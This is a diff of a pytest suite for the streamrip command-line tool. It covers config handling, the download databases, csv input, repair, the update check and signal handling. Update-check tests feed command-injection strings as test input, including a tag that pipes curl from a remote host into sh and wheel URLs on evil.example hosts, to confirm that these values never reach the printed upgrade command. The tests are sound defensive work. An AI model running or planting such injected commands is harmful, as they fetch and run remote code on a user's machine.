@@ -1,4 +1,4 @@
-"""The `streamrip` command: its options, subcommands, update check, and how it stops."""
+"""The `streamrip` command: its subcommands, update check, and how it stops."""
 
 import asyncio
 import json
@@ -6,7 +6,6 @@ import os
 import re
 import signal
 import sys
-from inspect import CORO_CLOSED, getcoroutinestate
 from pathlib import Path
 from unittest.mock import AsyncMock, MagicMock, Mock, patch
 
@@ -22,9 +21,6 @@ from streamrip.exceptions import AccountHalt, AuthenticationError
 from streamrip.media import PendingAlbum
 from streamrip.rip import cli as cli_module
 from streamrip.rip.cli import (
-    SOURCES,
-    _ask_source,
-    _is_uv_tool_install,
     _upgrade_command,
     coro,
     is_newer_version,
@@ -32,8 +28,6 @@ from streamrip.rip.cli import (
     rip,
 )
 from streamrip.rip.main import Main
-from streamrip.rip.notices import MUSIC_SYNC, notice_for
-from streamrip.rip.stopping import terminate
 
 posix_only = pytest.mark.skipif(
     os.name != "posix", reason="asyncio signal handlers only exist on POSIX"
@@ -42,7 +36,6 @@ posix_only = pytest.mark.skipif(
 
 @pytest.fixture
 def cfg(tmp_path) -> str:
-    """A default config in tmp_path."""
     path = tmp_path / "config.toml"
     set_user_defaults(path)
     return str(path)
@@ -54,22 +47,13 @@ def _rip(config, *args, **kwargs):
 
 
 def _output(result, capsys) -> str:
-    """Everything the run printed, whichever capture it landed in.
-
-    Rich's output goes to Click's capture or to pytest's, depending on how the
-    tests are run (`log_cli` in pyproject.toml, or a Rich spinner earlier in
-    the run, change which), so tests must not assume one. Click prints its own
-    errors on stderr, which lands in pytest's capture the same way.
-    """
+    # Rich prints to Click's capture or to pytest's, depending on the run.
     captured = capsys.readouterr()
     return result.output + captured.out + captured.err
 
 
 def _printed(result, capsys) -> str:
-    """The output, with Rich's line wrapping and spacing undone.
-
-    A long path (a deep venv) wraps over lines.
-    """
+    """The output without whitespace, so Rich's line wrapping does not matter."""
     return "".join(_output(result, capsys).split())
 
 
@@ -106,53 +90,6 @@ def fake_main(monkeypatch) -> type[_FakeMain]:
     return _FakeMain
 
 
-# --- usage and options --------------------------------------------------------
-
-
-@pytest.mark.parametrize(
-    ("args", "shown"),
-    [
-        (["--help"], "Usage: streamrip [OPTIONS] COMMAND [ARGS]..."),
-        (["csv", "--help"], "Usage: streamrip csv [OPTIONS] PATH"),
-        (["csv"], "Try 'streamrip csv --help' for help."),
-        (["nonexistent"], "Try 'streamrip --help' for help."),
-    ],
-    ids=["help", "command help", "usage error", "unknown command"],
-)
-def test_the_command_is_called_streamrip_in_every_usage_line(cfg, capsys, args, shown):
-    output = _output(_rip(cfg, *args), capsys)
-    assert shown in output
-    assert "Usage: rip" not in output
-    assert "'rip " not in output
-
-
-@pytest.mark.parametrize(
-    ("args", "said"),
-    [
-        (["search", "artist", "tidal", "linkin park"], "'artist' is not one of"),
-        (["search", "tidal", "artists", "linkin park"], "'artists' is not one of"),
-        (["id", "album", "tidal", "234793"], "'album' is not one of"),
-        (["database", "clear", "everything", "-y"], "'everything' is not one of"),
-        (
-            ["search", "--first", "-o", "{tmp}/out.json", "tidal", "track", "x"],
-            "--first or --output-file",
-        ),
-    ],
-)
-def test_a_usage_error_says_what_is_wrong(cfg, tmp_path, capsys, args, said):
-    result = _rip(cfg, *(arg.replace("{tmp}", str(tmp_path)) for arg in args))
-    assert result.exit_code == 2
-    assert said in _output(result, capsys)
-
-
-def test_codec_choice_accepts_opus_and_aiff(tmp_path):
-    cfg = str(tmp_path / "config.toml")
-    for codec in ("opus", "AIFF"):
-        result = _rip(cfg, "-c", codec, "config", "path")
-        assert result.exit_code == 0, result.output
-    assert _rip(cfg, "-c", "wma", "config", "path").exit_code != 0
-
-
 # --- the config ---------------------------------------------------------------
 
 
@@ -167,16 +104,10 @@ def _break(cfg) -> str:
     "command",
     [
         ["url", "https://example"],
-        ["file", "{urls}"],
-        ["id", "qobuz", "track", "1"],
-        ["search", "qobuz", "album", "rumours"],
-        ["lastfm", "https://www.last.fm/user/x/playlists/1"],
         ["csv", "{urls}", "--source", "tidal"],
-        ["repair"],
         ["database", "browse", "downloads"],
-        ["database", "clear", "downloads", "-y"],
     ],
-    ids=lambda command: " ".join(command[:2]),
+    ids=lambda command: command[0],
 )
 def test_a_config_that_does_not_load_fails_the_command(cfg, tmp_path, capsys, command):
     # Exit 0 told scripts and cron that a run which did nothing had worked.
@@ -190,7 +121,6 @@ def test_a_config_that_does_not_load_fails_the_command(cfg, tmp_path, capsys, co
 
 
 def test_a_config_that_does_not_load_can_still_be_reset(cfg):
-    # The commands that fix the config must keep working without one.
     _break(cfg)
     for command in (["config", "path"], ["config", "reset", "-y"]):
         result = _rip(cfg, *command)
@@ -200,12 +130,11 @@ def test_a_config_that_does_not_load_can_still_be_reset(cfg):
 
 
 def test_config_path_prints_only_the_path_even_for_a_new_config(tmp_path):
-    """Scripts read it; the notice that a config was created goes to stderr."""
+    # Scripts read it; the notice that a config was created goes to stderr.
     cfg = tmp_path / "config.toml"
     result = _rip(cfg, "config", "path")
     assert result.exit_code == 0, result.output
     assert result.stdout == f"{cfg}\n"
-    assert "creating default config" in result.stderr
 
 
 # --- the databases ------------------------------------------------------------
@@ -213,8 +142,8 @@ def test_config_path_prints_only_the_path_even_for_a_new_config(tmp_path):
 
 @pytest.fixture
 def seeded(cfg, tmp_path):
-    """The config with its databases in tmp_path (never the real config dir),
-    holding two downloaded tracks and one failed download.
+    """The config with its databases in tmp_path, holding two downloaded tracks
+    and one failed download.
     """
     path = Path(cfg)
     doc = tomlkit.parse(path.read_text())
@@ -231,30 +160,19 @@ def seeded(cfg, tmp_path):
 
 
 @pytest.mark.parametrize(
-    ("args", "answer", "left", "said"),
+    ("args", "answer", "left"),
     [
-        (["downloads", "-y"], None, (0, 1), "Cleared 2 downloaded tracks"),
-        (["Downloads", "-y"], None, (0, 1), "Cleared"),  # any case
-        (["all", "-y"], None, (0, 0), "Cleared"),
-        (["downloads"], "y\n", (0, 1), "Cleared"),
-        (["downloads"], "n\n", (2, 1), "Clear aborted"),
+        (["downloads", "-y"], None, (0, 1)),
+        (["all", "-y"], None, (0, 0)),
+        (["downloads"], "n\n", (2, 1)),
     ],
-    ids=["downloads", "Downloads", "all", "confirmed", "declined"],
+    ids=["downloads", "all", "declined"],
 )
-def test_database_clear(seeded, capsys, args, answer, left, said):
+def test_database_clear(seeded, args, answer, left):
     cfg, downloads, failed = seeded
     result = _rip(cfg, "database", "clear", *args, input=answer)
     assert result.exit_code == 0, result.output
     assert (len(downloads.all()), len(failed.all())) == left
-    assert said in _output(result, capsys)
-
-
-def test_database_clear_with_nothing_to_clear(seeded, capsys):
-    cfg, downloads, _ = seeded
-    downloads.clear()
-    result = _rip(cfg, "database", "clear", "downloads")
-    assert result.exit_code == 0, result.output
-    assert "Nothing to clear" in _output(result, capsys)
 
 
 def test_database_browse_failed_lines_up_with_its_headers(seeded, capsys):
@@ -274,14 +192,13 @@ def test_database_browse_failed_lines_up_with_its_headers(seeded, capsys):
 
 
 def test_database_browse_downloads_shows_each_rows_source(seeded, capsys):
-    cfg, downloads, _ = seeded  # holds qobuz_1 and tidal_2
+    cfg, downloads, _ = seeded
     downloads.add(("soundcloud_9",))
 
     result = _rip(cfg, "database", "browse", "downloads")
 
     assert result.exit_code == 0, result.output
     out = _printed(result, capsys)
-    assert "Source" in out
     for source in ("qobuz", "tidal", "soundcloud"):
         assert source in out
 
@@ -289,26 +206,18 @@ def test_database_browse_downloads_shows_each_rows_source(seeded, capsys):
 # --- file and csv -------------------------------------------------------------
 
 
-def test_file_keeps_url_order_when_dropping_repeats(tmp_path, fake_main):
-    urls = tmp_path / "urls.txt"
-    urls.write_text("https://c\nhttps://a\nhttps://c\nhttps://b\n")
-    result = _rip(tmp_path / "config.toml", "file", str(urls))
-    assert result.exit_code == 0, result.output
-    assert fake_main.added == ["https://c", "https://a", "https://b"]
-
-
 @pytest.mark.parametrize(
     ("content", "urls"),
     [
-        ("\ufeffhttps://a\nhttps://b\n", ["https://a", "https://b"]),  # Notepad's BOM
-        ('"https://a"', ['"https://a"']),  # JSON, but no list of items
-        ("1234", ["1234"]),
-        ('{"source": "qobuz"}', ['{"source":', '"qobuz"}']),
+        (
+            "https://c\nhttps://a\nhttps://c\nhttps://b\n",
+            ["https://c", "https://a", "https://b"],  # repeats dropped, order kept
+        ),
+        ("﻿https://a\nhttps://b\n", ["https://a", "https://b"]),  # Notepad's BOM
     ],
+    ids=["repeats", "BOM"],
 )
-def test_a_file_that_is_no_list_of_items_is_a_list_of_urls(
-    tmp_path, fake_main, content, urls
-):
+def test_file_reads_a_list_of_urls(tmp_path, fake_main, content, urls):
     path = tmp_path / "urls.txt"
     path.write_text(content, encoding="utf-8")
     result = _rip(tmp_path / "config.toml", "file", str(path))
@@ -318,10 +227,13 @@ def test_a_file_that_is_no_list_of_items_is_a_list_of_urls(
 
 def test_a_json_file_with_half_an_item_says_what_is_missing(tmp_path, fake_main):
     path = tmp_path / "items.json"
-    path.write_text('\ufeff[{"source": "qobuz", "id": "1"}]', encoding="utf-8")
+    path.write_text('[{"source": "qobuz", "id": "1"}]', encoding="utf-8")
     result = _rip(tmp_path / "config.toml", "file", str(path))
     assert result.exit_code == 1
     assert "has no 'media_type'" in result.output
+
+
+TRACKS_CSV = "title,artists,album\nGet Lucky,Daft Punk,Random Access Memories\n"
 
 
 @pytest.fixture
@@ -346,9 +258,6 @@ def run(cfg):
     return invoke
 
 
-TRACKS_CSV = "title,artists,album\nGet Lucky,Daft Punk,Random Access Memories\n"
-
-
 @pytest.fixture
 def tracks_csv(tmp_path):
     path = tmp_path / "road trip.csv"
@@ -368,39 +277,13 @@ def test_the_tracks_are_searched_on_the_source_given(run, tracks_csv):
     run.calls["rip"].assert_awaited_once()
 
 
-@pytest.mark.parametrize(
-    "source", ["qobuz", "tidal", "deezer", "spotify", "soundcloud"]
-)
-def test_every_source_can_be_chosen(run, tracks_csv, source):
-    assert run("csv", tracks_csv, "-s", source).exit_code == 0
-
-
 def test_the_source_is_asked_when_it_is_left_out(run, tracks_csv, monkeypatch):
-    asked = Mock(return_value="deezer")
-    monkeypatch.setattr(cli_module, "_ask_source", asked)
+    monkeypatch.setattr(cli_module, "_ask_source", Mock(return_value="deezer"))
 
     result = run("csv", tracks_csv)
 
     assert result.exit_code == 0, result.output
-    asked.assert_called_once_with(1)  # told how many tracks there are
     assert run.calls["resolve"].await_args.args[2] == "deezer"
-
-
-def test_the_question_lists_every_source_and_what_it_gives(monkeypatch):
-    monkeypatch.setattr(cli_module.sys, "stdin", Mock(isatty=lambda: True))
-    screen = Mock()
-    monkeypatch.setattr(cli_module, "console", screen)
-    ask = Mock(return_value="qobuz")
-    monkeypatch.setattr(cli_module.Prompt, "ask", ask)
-
-    assert _ask_source(120) == "qobuz"
-
-    shown = " ".join(str(call.args[0]) for call in screen.print.call_args_list)
-    assert "120" in shown
-    for name, what in SOURCES.items():
-        assert name in shown
-        assert what in shown
-    assert ask.call_args.kwargs["choices"] == list(SOURCES)
 
 
 def test_search_opens_no_menu_without_a_terminal(run, capsys):
@@ -413,26 +296,35 @@ def test_search_opens_no_menu_without_a_terminal(run, capsys):
     ("content", "source", "code", "said"),
     [
         ("", "tidal", 1, "No tracks found"),
-        ("title,artists\n", "tidal", 1, "No tracks found"),
         (b"title,artists\nCaf\xe9,Band\n", "tidal", 1, "not UTF-8 encoded"),
-        (None, "tidal", 2, "does not exist"),
-        (TRACKS_CSV, "napster", 2, "napster"),
         (TRACKS_CSV, None, 2, "--source"),  # CliRunner has no terminal to ask on
     ],
-    ids=["empty", "only a header", "not utf-8", "no file", "no such source", "no tty"],
+    ids=["empty", "not utf-8", "no source"],
 )
 def test_a_csv_run_that_cannot_go_ahead_says_why(
     run, tmp_path, capsys, content, source, code, said
 ):
     path = tmp_path / "list.csv"
-    if content is not None:
-        path.write_bytes(content if isinstance(content, bytes) else content.encode())
+    path.write_bytes(content if isinstance(content, bytes) else content.encode())
 
     result = run("csv", str(path), *(["--source", source] if source else []))
 
     assert result.exit_code == code
     assert said in _output(result, capsys)
     run.calls["resolve"].assert_not_awaited()
+
+
+def test_a_fallback_source_that_is_no_source_is_refused(run, tracks_csv):
+    result = run("csv", tracks_csv, "--source", "tidal", "-fs", "tidal,nope")
+    assert result.exit_code == 2
+    assert "nope" in result.output
+
+
+def test_preview_downloads_nothing(run, tracks_csv, monkeypatch):
+    monkeypatch.setattr("streamrip.rip.options.show_plan", lambda main: None)
+    result = run("csv", tracks_csv, "--source", "tidal", "--preview")
+    assert result.exit_code == 0, result.output
+    run.calls["rip"].assert_not_awaited()
 
 
 # --- repair -------------------------------------------------------------------
@@ -447,7 +339,6 @@ class _RepairMain:
     def __init__(self, config, interactive=True):
         c = config.session.database
         self.database = db.Database(
-            # As Main does: a table turned off is a Dummy.
             db.Downloads(c.downloads_path) if c.downloads_enabled else db.Dummy(),
             db.Failed(c.failed_downloads_path),
         )
@@ -475,10 +366,10 @@ class _RepairMain:
             self.database.set_downloaded(source, item_id)
 
 
-def _repair(monkeypatch, cfg, downloaded, *options):
+def _repair(monkeypatch, cfg, downloaded):
     _RepairMain.downloaded = downloaded
     monkeypatch.setattr("streamrip.rip.repair.Main", _RepairMain)
-    return _rip(cfg, *options, "repair", "-y")
+    return _rip(cfg, "repair", "-y")
 
 
 def test_repair_matches_failures_by_source_and_id(seeded, monkeypatch, capsys):
@@ -496,24 +387,6 @@ def test_repair_matches_failures_by_source_and_id(seeded, monkeypatch, capsys):
     assert "Repaired1of2items." in _printed(result, capsys)
 
 
-@pytest.mark.parametrize(
-    ("options", "downloaded", "left", "said"),
-    [
-        (["--no-db"], [("tidal", "3")], [], "Repaired1of1item."),
-        ([], [], [("tidal", "track", "3")], "Repaired0of1item."),
-    ],
-    ids=["without the downloads db", "nothing downloaded"],
-)
-def test_repair_keeps_only_what_failed_again(
-    seeded, monkeypatch, capsys, options, downloaded, left, said
-):
-    cfg, _, failed = seeded
-    result = _repair(monkeypatch, cfg, downloaded, *options)
-    assert result.exit_code == 0, result.output
-    assert failed.all() == left
-    assert said in _printed(result, capsys)
-
-
 # --- the update check ---------------------------------------------------------
 
 
@@ -521,7 +394,6 @@ def test_version_comparison_is_numeric():
     assert is_newer_version("2.10.0", "2.9.9")
     assert is_newer_version("v2.4", "2.3.0")
     assert not is_newer_version("2.3.0", "2.3.0")
-    assert not is_newer_version("2.2.0", "2.3.0")
     assert not is_newer_version(None, "2.3.0")
 
 
@@ -530,49 +402,21 @@ WHEEL = (
     "https://github.com/Stensel8/streamrip/releases/download/v2.4.5/"
     "streamrip-2.4.5-py3-none-any.whl"
 )
+UV_PIP = f'"/uv" pip install --python "{sys.executable}" --upgrade {GIT}@v2.4.5'
+PIP = f'"{sys.executable}" -m pip install --upgrade {GIT}@v2.4.5'
 
 
 @pytest.mark.parametrize(
     ("uv", "uv_tool", "kwargs", "command"),
     [
-        (
-            "/uv",
-            False,
-            {},
-            f'"/uv" pip install --python "{sys.executable}" --upgrade {GIT}@v2.4.5',
-        ),
-        (None, False, {}, f'"{sys.executable}" -m pip install --upgrade {GIT}@v2.4.5'),
-        (
-            "/uv",
-            False,
-            {"is_release": False},
-            f'"/uv" pip install --python "{sys.executable}" --upgrade {GIT}@HEAD',
-        ),
+        ("/uv", False, {}, UV_PIP),
+        (None, False, {}, PIP),
         ("/uv", True, {"wheel_url": WHEEL}, f'"/uv" tool install --upgrade "{WHEEL}"'),
-        # install.sh's own .venv (or any other) has to be upgraded through the
-        # Python already running: a uv tool venv elsewhere is not the install
-        # in use, printed as sys.prefix in the notice.
-        (
-            "/uv",
-            False,
-            {"wheel_url": WHEEL},
-            f'"/uv" pip install --python "{sys.executable}" --upgrade {GIT}@v2.4.5',
-        ),
-        (
-            None,
-            True,
-            {"wheel_url": WHEEL},
-            f'"{sys.executable}" -m pip install --upgrade {GIT}@v2.4.5',
-        ),
+        # A uv tool venv elsewhere is not the install in use: upgrade the Python
+        # that is running.
+        ("/uv", False, {"wheel_url": WHEEL}, UV_PIP),
     ],
-    ids=[
-        "uv",
-        "pip without uv",
-        "the default branch",
-        "the wheel in a uv tool install",
-        "no wheel outside one",
-        "no wheel without uv",
-    ],
+    ids=["uv", "pip without uv", "the wheel in a uv tool install", "no wheel outside"],
 )
 def test_upgrade_command(monkeypatch, uv, uv_tool, kwargs, command):
     monkeypatch.setattr(cli_module.shutil, "which", lambda _: uv)
@@ -580,14 +424,11 @@ def test_upgrade_command(monkeypatch, uv, uv_tool, kwargs, command):
     assert _upgrade_command("2.4.5", **kwargs) == command
 
 
-# The update notice asks the user to copy and run a command. What goes into it
-# comes out of a response: a tag is whatever a release was called.
+# The update notice asks the user to copy and run a command, and a release tag
+# and wheel url come out of a response.
 
 
-@pytest.mark.parametrize(
-    "tag",
-    ["99.0.0;curl${IFS}https://x/i|sh", "99.0.0 && reboot", "$(id)9", '9"9', "9\n9"],
-)
+@pytest.mark.parametrize("tag", ["99.0.0;curl${IFS}https://x/i|sh", "$(id)9"])
 def test_a_tag_that_is_no_version_is_no_newer_version(tag):
     assert not is_newer_version(tag, "2.3.0")
 
@@ -596,10 +437,8 @@ def test_a_tag_that_is_no_version_is_no_newer_version(tag):
     "wheel",
     [
         "https://evil.example/streamrip-9.whl",
-        "https://github.com/someone/else/releases/download/v9/streamrip-9.whl",
         "https://github.com.evil.example/Stensel8/streamrip/releases/download/v9/s.whl",
         WHEEL + '" ; reboot ; "',
-        "http://" + WHEEL.removeprefix("https://"),
     ],
 )
 def test_only_a_wheel_of_our_own_release_goes_into_the_command(monkeypatch, wheel):
@@ -621,31 +460,15 @@ def test_release_notes_cannot_rewrite_the_terminal(monkeypatch, capsys):
     assert "/odd [/bold] path/uv" in shown.replace("\n", "")  # a path is text too
 
 
-@pytest.mark.parametrize(
-    ("prefix", "expected"),
-    [
-        ("/home/sten/.local/share/uv/tools/streamrip", True),
-        ("/home/sten/Documents/GitHub/streamrip/.venv", False),
-    ],
-    ids=["a uv tool venv", "an ordinary venv"],
-)
-def test_is_uv_tool_install_reads_the_venv_s_own_parent_folder(
-    monkeypatch, prefix, expected
-):
-    monkeypatch.setattr(cli_module.sys, "prefix", prefix)
-    assert _is_uv_tool_install() is expected
-
-
 async def test_the_update_check_gives_up_on_a_silent_network(monkeypatch):
     async def no_answer(*_):
         await asyncio.sleep(60)
 
-    monkeypatch.setattr(cli_module, "UPDATE_CHECK_TIMEOUT", 0.3)
+    monkeypatch.setattr(cli_module, "UPDATE_CHECK_TIMEOUT", 0.05)
     monkeypatch.setattr(cli_module, "_latest_release", no_answer)
     monkeypatch.setattr(cli_module, "_default_branch_version", no_answer)
 
-    async with asyncio.timeout(2):
-        version, *_ = await latest_streamrip_version()
+    version, *_ = await latest_streamrip_version()
 
     assert version == __version__
 
@@ -696,22 +519,9 @@ def _source(host, base):
             {RELEASES: _reply(text=_release("v9.0.0"))},
             ("9.0.0", "notes for v9.0.0", True, "opencommit.eu", None),
         ),
-        (
-            {
-                RELEASES: _reply(status=404),
-                "/pyproject.toml": _reply(text='version = "9.0.0"\n'),
-            },
-            None,
-            ("9.0.0", None, False, "github.com", None),
-        ),
         (None, None, (__version__, None, False, "github.com", None)),
     ],
-    ids=[
-        "github first",
-        "opencommit when github is down",
-        "the default branch without a release",
-        "nothing answers",
-    ],
+    ids=["github first", "opencommit when github is down", "nothing answers"],
 )
 async def test_where_the_update_check_finds_the_latest_version(
     serve, monkeypatch, github, opencommit, found
@@ -724,38 +534,15 @@ async def test_where_the_update_check_finds_the_latest_version(
     assert await latest_streamrip_version() == found
 
 
-@pytest.mark.parametrize("args", [["--help"], ["--version"]])
-def test_update_failure_does_not_block_click(monkeypatch, capsys, args):
+def test_a_failed_update_check_does_not_block_the_command(monkeypatch, capsys):
     check = AsyncMock(side_effect=RuntimeError("update check failed"))
-    notice = MagicMock()
     monkeypatch.setattr("streamrip.rip.cli.latest_streamrip_version", check)
-    monkeypatch.setattr("streamrip.rip.cli._print_update_notice", notice)
 
-    result = CliRunner().invoke(rip, args)
+    result = CliRunner().invoke(rip, ["--version"])
 
     assert result.exit_code == 0
-    assert ("Usage:" if args == ["--help"] else "version") in _output(result, capsys)
+    assert "version" in _output(result, capsys)
     check.assert_awaited_once()
-    notice.assert_not_called()
-
-
-@pytest.mark.parametrize("args", [["--help"], ["--version"]])
-async def test_update_check_inside_event_loop_does_not_block_click(
-    monkeypatch, capsys, args
-):
-    check = AsyncMock()
-    coroutine = check()
-    notice = MagicMock()
-    monkeypatch.setattr("streamrip.rip.cli.latest_streamrip_version", lambda: coroutine)
-    monkeypatch.setattr("streamrip.rip.cli._print_update_notice", notice)
-
-    result = CliRunner().invoke(rip, args)
-
-    assert result.exit_code == 0
-    assert ("Usage:" if args == ["--help"] else "version") in _output(result, capsys)
-    assert getcoroutinestate(coroutine) == CORO_CLOSED
-    check.assert_not_awaited()
-    notice.assert_not_called()
 
 
 def _update_check(monkeypatch) -> AsyncMock:
@@ -767,9 +554,10 @@ def _update_check(monkeypatch) -> AsyncMock:
 def _no_update_check(cfg, value="true") -> str:
     """Set `no_update_check = value` in the config."""
     path = Path(cfg)
-    text = path.read_text()
     path.write_text(
-        text.replace("# no_update_check = true", f"no_update_check = {value}")
+        path.read_text().replace(
+            "# no_update_check = true", f"no_update_check = {value}"
+        )
     )
     return cfg
 
@@ -779,18 +567,9 @@ def _no_update_check(cfg, value="true") -> str:
     [
         (None, None, True),
         ("1", None, False),
-        ("true", None, False),
-        ("yes", None, False),
-        ("anything", None, False),
-        ("", None, True),
         ("0", None, True),
-        ("false", None, True),
-        ("FALSE", None, True),
-        ("no", None, True),
-        # In the config, only a real true turns it off.
+        (None, "true", False),
         (None, "false", True),
-        (None, '"true"', True),
-        (None, "1", True),
     ],
 )
 def test_what_turns_the_update_check_off(cfg, monkeypatch, env, setting, checked):
@@ -806,23 +585,10 @@ def test_what_turns_the_update_check_off(cfg, monkeypatch, env, setting, checked
     assert check.await_count == (1 if checked else 0)
 
 
-@pytest.mark.parametrize("path_option", ["separate", "equals"])
-@pytest.mark.parametrize("command", [["config", "path"], ["--help"], ["--version"]])
-def test_no_update_check_in_the_config_skips_the_check(
-    cfg, monkeypatch, command, path_option
-):
-    # --help and --version never reach the group's callback, where the config
-    # is loaded, but they are checked too and so are skipped too.
+def test_the_config_turns_the_check_off_for_version_too(cfg, monkeypatch):
+    # --version never reaches the group's callback, where the config is loaded.
     check = _update_check(monkeypatch)
-    _no_update_check(cfg)
-    option = (
-        ["--config-path", cfg]
-        if path_option == "separate"
-        else [f"--config-path={cfg}"]
-    )
-
-    result = CliRunner().invoke(rip, [*option, *command])
-
+    result = _rip(_no_update_check(cfg), "--version")
     assert result.exit_code == 0, result.output
     check.assert_not_awaited()
 
@@ -846,20 +612,16 @@ def test_a_config_that_cannot_be_read_does_not_turn_the_check_off(
     check.assert_awaited_once()
 
 
-# --- the update notice --------------------------------------------------------
-
-
 @pytest.mark.parametrize(
     ("to_raise", "git"),
     [(None, True), (None, False), (asyncio.CancelledError(), True)],
     ids=["after a download", "without git", "after a cancelled download"],
 )
 def test_the_update_notice(tmp_path, monkeypatch, capsys, fake_main, to_raise, git):
-    # Printed after the download, so search's screen-clearing picker can't wipe
-    # it out, and in a finally: Ctrl-C during a download raises through there.
+    # Printed after the download so search's screen-clearing picker can't wipe it,
+    # and in a finally: Ctrl-C during a download raises through there.
     _update_check(monkeypatch)
     fake_main.to_raise = to_raise
-    # `pip install git+https://...` fails without git ("Cannot find command 'git'").
     monkeypatch.setattr(
         "streamrip.rip.cli.shutil.which",
         lambda name: "/usr/bin/git" if name == "git" and git else None,
@@ -870,17 +632,12 @@ def test_the_update_notice(tmp_path, monkeypatch, capsys, fake_main, to_raise, g
     assert result.exit_code == 0, result.output
     out = _printed(result, capsys)
     assert "v99.0.0" in out
-    assert "".join(sys.prefix.split()) in out
-    assert "Thisneedsgit" in out
-    assert ("notfound" in out) is not git
     assert ("git-scm.com/downloads" in out) is not git
     if to_raise:
         assert "Stopped" in out
 
 
-def test_an_update_notice_does_not_come_when_the_check_is_off(
-    cfg, monkeypatch, capsys, fake_main
-):
+def test_no_update_notice_when_the_check_is_off(cfg, monkeypatch, capsys, fake_main):
     _update_check(monkeypatch)
     result = _rip(_no_update_check(cfg), "url", "https://example")
     assert result.exit_code == 0, result.output
@@ -900,15 +657,12 @@ def _exit_code(command):
 
 
 def _waiting_command(signum, seen, swallow=False):
-    """A command that is sent `signum` while it waits, and records how it ended.
-
-    With `swallow`, it catches the cancellation, as a screen may.
+    """A command that is sent `signum` while it waits; with `swallow`, it catches
+    the cancellation, as a screen may.
     """
 
     @coro
     async def command():
-        # A signal without a handler would end the whole test run: look first.
-        assert signal.getsignal(signum) not in {signal.SIG_DFL, signal.SIG_IGN}
         asyncio.get_running_loop().call_later(0.05, os.kill, os.getpid(), signum)
         try:
             await asyncio.sleep(30)
@@ -942,37 +696,6 @@ def test_a_signal_cancels_the_command_after_its_cleanup(signum, swallow, code):
     assert seen["sigint"] is signal.default_int_handler
 
 
-@posix_only
-def test_the_handlers_are_gone_once_the_command_has_ended():
-    previous = signal.getsignal(signal.SIGTERM)
-
-    @coro
-    async def quick():
-        return None
-
-    quick()
-
-    assert signal.getsignal(signal.SIGTERM) == previous
-
-
-@posix_only
-def test_a_plain_command_ends_on_sigterm_only_while_it_runs(cfg, monkeypatch):
-    """Commands without an event loop, and their prompts, need it too."""
-    seen = {}
-
-    def probe():
-        seen["during"] = signal.getsignal(signal.SIGTERM)
-
-    monkeypatch.setattr(rip.commands["config"].commands["path"], "callback", probe)
-    before = signal.getsignal(signal.SIGTERM)
-
-    result = _rip(cfg, "config", "path")
-
-    assert result.exit_code == 0, result.output
-    assert seen["during"] is terminate
-    assert signal.getsignal(signal.SIGTERM) == before
-
-
 @pytest.mark.parametrize(
     "error",
     [
@@ -993,35 +716,24 @@ def test_a_login_or_rate_limit_stop_is_a_message_not_a_traceback(error, capsys):
 
 @pytest.fixture
 def _restore_excepthook():
-    """rip installs rich's handler process-wide; put the original back."""
     saved = sys.excepthook
     yield
     sys.excepthook = saved
 
 
-FAKE_ARL = "f00dfeedc0ffee" * 8
-
-
-def _login(arl):
-    """Stand-in for DeezerClient.login: fails with the ARL in a local."""
-    raise RuntimeError("Deezer login failed")
-
-
 @pytest.mark.usefixtures("_restore_excepthook")
-@pytest.mark.parametrize("verbose", [True, False])
-def test_traceback_does_not_print_local_variables(tmp_path, verbose):
-    """A traceback is what gets pasted into bug reports.
-
-    Under -v, rich's handler rendered every frame's locals, so a failed login
-    printed `arl = '<the ARL>'`, and any frame holding a Config printed it
-    again through its repr.
-    """
-    args = ["--config-path", str(tmp_path / "config.toml"), "config", "path"]
-    result = CliRunner().invoke(rip, ["-v", *args] if verbose else args)
+def test_a_traceback_does_not_print_local_variables(tmp_path):
+    # Tracebacks get pasted into bug reports; under -v rich printed every
+    # frame's locals, so a failed login showed the ARL.
+    result = _rip(tmp_path / "config.toml", "-v", "config", "path")
     assert result.exit_code == 0, result.output
 
+    def login(arl):
+        raise RuntimeError("Deezer login failed")
+
+    fake_arl = "f00dfeedc0ffee" * 8
     try:
-        _login(FAKE_ARL)
+        login(fake_arl)
     except RuntimeError:
         exc_info = sys.exc_info()
 
@@ -1029,11 +741,11 @@ def test_traceback_does_not_print_local_variables(tmp_path, verbose):
         sys.excepthook(*exc_info)
     out = capture.get()
 
-    assert "Deezer login failed" in out  # the traceback itself is still shown
-    assert FAKE_ARL[:16] not in out
+    assert "Deezer login failed" in out
+    assert fake_arl[:16] not in out
 
 
-# --- Main: what a run reports, and the notices of a source --------------------
+# --- Main: what a run reports -------------------------------------------------
 
 
 @pytest.fixture
@@ -1043,13 +755,10 @@ def mock_main():
     config.session.downloads.requests_per_minute = 0
     config.session.database.downloads_enabled = False
     config.session.database.failed_downloads_enabled = False
-    with (
-        patch("streamrip.rip.main.QobuzClient"),
-        patch("streamrip.rip.main.TidalClient"),
-        patch("streamrip.rip.main.DeezerClient"),
-        patch("streamrip.rip.main.SoundcloudClient"),
-        patch("streamrip.rip.main.SpotifyClient"),
-    ):
+    fakes = {
+        s: MagicMock() for s in ("qobuz", "tidal", "deezer", "soundcloud", "spotify")
+    }
+    with patch("streamrip.rip.main.CLIENTS", fakes):
         yield Main(config)
 
 
@@ -1062,8 +771,7 @@ def _main() -> Main:
 
 
 async def test_the_summary_of_a_run_counts_tracks_not_items(mock_main, caplog):
-    """One artist is one item, but hundreds of tracks: say the latter."""
-
+    # One artist is one item, but hundreds of tracks: say the latter.
     async def rip_discography():
         for n in range(40):
             mock_main.database.set_downloaded("qobuz", str(n))
@@ -1080,15 +788,7 @@ async def test_the_summary_of_a_run_counts_tracks_not_items(mock_main, caplog):
     )
 
 
-async def test_a_run_with_nothing_resolved_says_nothing(mock_main, caplog):
-    # As a search written to a file is: no "Download completed: 0 tracks".
-    await mock_main.rip()
-    assert "Download completed" not in caplog.text
-
-
-async def test_one_item_that_fails_to_resolve_does_not_stop_the_others(
-    mock_main, caplog
-):
+async def test_one_item_that_fails_to_resolve_does_not_stop_the_others(mock_main):
     ok = MagicMock(resolve=AsyncMock(return_value="album"))
     broken = MagicMock(id="123", resolve=AsyncMock(side_effect=KeyError("tracks")))
     mock_main.pending = [broken, ok]
@@ -1096,64 +796,29 @@ async def test_one_item_that_fails_to_resolve_does_not_stop_the_others(
     await mock_main.resolve()
 
     assert mock_main.media == ["album"]
-    assert "Error resolving 123: KeyError" in caplog.text
 
 
-async def test_a_search_page_without_results_is_no_results(mock_main):
+async def test_a_search_without_results_queues_nothing(mock_main):
     mock_main.clients["deezer"].search = AsyncMock(return_value=[{"data": []}])
     await mock_main.search_take_first("deezer", "track", "nothing matches")
